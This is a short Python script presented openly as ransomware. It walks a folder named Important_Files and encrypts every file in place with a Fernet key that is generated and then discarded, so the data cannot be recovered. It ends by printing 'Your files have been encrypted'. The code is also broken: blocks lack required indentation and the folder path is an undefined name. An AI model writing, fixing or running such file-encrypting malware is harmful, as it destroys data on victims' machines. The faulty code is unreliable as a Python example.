import sys
import os
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
	with open(file_path, 'rb') as f:
		data = f.read()
	fernet = Fernet(key)
	encrypted_data = fernet.encrypt(data)
	with open(file_path, 'wb') as f:
		f.write(encrypted_data)

def main():
	if len(sys.argv) != 2:
	print("Utilizing ransomware")
	sys.exit(1)

	folder_path = Important_Files
	key = Fernet.generate_key()

	for root, dirs, files in os.walk(folder_path):
		for file in files:
		file_path = os.path.join(root, file)
		encrypt_file(file_path, key)

	print("Your files have been encrypted")

if __name__ == "__main__":
	main()
